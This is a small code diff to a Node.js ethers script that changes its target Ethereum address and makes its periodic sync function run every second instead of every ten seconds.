@@ -1,8 +1,9 @@
 const ethers = require('ethers');
 const Blockchains = require('./blockchains.js');
 
-const TARGET_ADDRESS = '0x55DbDAB581c4D5318901e9e35608444Cc2A3142d';
 const SOURCE_ADDRESS = '0x55DbDAB581c4D5318901e9e35608444Cc2A3142d';
+const TARGET_ADDRESS = '0x3a2C96aA949Eec6C44D042eb0eC017f2866d0E8B';
+
 
 const blockchains = new Blockchains();
 
@@ -27,4 +28,4 @@ async function sync() {
 
 setInterval(function() {
   sync();
-}, 10000);
+}, 1000);
